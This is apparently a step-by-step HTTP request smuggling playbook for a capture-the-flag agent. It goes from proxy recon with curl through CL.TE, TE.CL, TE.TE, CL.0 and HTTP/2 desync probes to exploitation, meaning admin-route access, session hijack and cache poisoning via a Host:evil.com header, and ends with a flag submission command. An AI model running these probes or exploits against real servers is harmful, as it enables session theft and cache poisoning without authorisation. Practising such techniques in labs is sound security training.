# Desync workflow — the ordered operator's path

## Phase 1 — recon — is a proxy in the path?

```bash
curl -sv http://t/ 2>&1 | grep -iE "via:|server:|x-backend|x-cache|x-served-by"
```

`Via:`/`X-Backend:`/`Server:` pair — the proxy+backend is live —
`smuggle-env.md`.

## Phase 2 — the fold-check — does a control char survive?

```bash
python3 tools/web/crlf_probe.py --url "http://t/?host={M}" --value "ex.com"
```

`crlf_probe` — the fold-matrix — `crlf-injection.md`.

## Phase 3 — the CL.TE check — does it hang?

```text
POST / CL:6 TE:chunked body=0\r\n\r\nG   →  3x → hang?
```

`detection.md` — the timing oracle.

## Phase 4 — the TE.CL check — the 404-poison

```text
POST / CL:4 TE:chunked body=5c\r\nGET /404 ...\r\nx=1\r\n0\r\n\r\n
→ GET / → 404?
```

`detection.md`.

## Phase 5 — the TE.TE check — the obfuscation

```text
For each obfuscation → the TE.CL probe → 404?
```

`obfuscation.md`.

## Phase 6 — the CL.CL / CL.0 checks

```text
CL:4 CL:7 body=...
POST /ignored CL:60 body=GET /marker
```

`cl-manipulation.md` / `client-side-desync.md`.

## Phase 7 — the upgrade / h2 checks

```text
GET /ws Upgrade:websocket
h2 POST / content-length:0 + DATA
```

`upgrade-smuggling.md` / `http2-smuggling.md`.

## Phase 8 — the exploit — what the smuggle reaches

```text
GET /admin / GET /flag — internal-routes.md
POST /store CL:400 body=x= — session-hijack.md
GET /?cb=xyz Host:evil.com — cache-poison-via-smuggle.md
```

`smuggle-exploitation.md`.

## Phase 9 — the readback — the smuggle's output

```text
GET / → the response is the smuggle's
```

`smuggle-readback.md`.

## Phase 10 — the flag — the verbatim excerpt

```bash
python3 tools/hooks.py pre-flag <name> --value "flag{...}" \
  --source "response" --evidence "<excerpt>"
```

`evidence-rules.md`.

## The budget — 5 probes / 15 min

`AGENTS.md` — the escalation order — `workflow.md`.
